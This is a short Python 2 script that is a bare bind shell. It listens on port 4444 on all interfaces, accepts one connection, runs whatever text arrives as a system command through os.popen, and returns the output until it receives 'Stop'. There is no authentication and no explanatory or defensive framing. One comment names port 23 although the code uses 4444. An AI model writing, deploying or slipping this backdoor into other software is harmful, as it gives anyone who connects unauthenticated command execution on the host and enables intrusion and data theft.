#!/usr/bin/python
from socket import *
from os import popen

server = socket(AF_INET,SOCK_STREAM)    # select socket type
server.bind(("0.0.0.0",4444))           # "" = 0.0.0.0  23 is the port number
server.listen(100)                      # 100 clients welcome :)
client,addr = server.accept()           # server accept the session here 
										# the code will wait until someone connect
print addr

data = "w"
while data != "Stop":
	data = client.recv(4096)                # receive data from client
	#raw_input(data)
	if data == "Stop" :break
	#print os.popen(data).read()
	client.sendall(popen(data).read())  # execute the command and send the data back to the client


client.close()                          # close the client
server.close()                          # server close
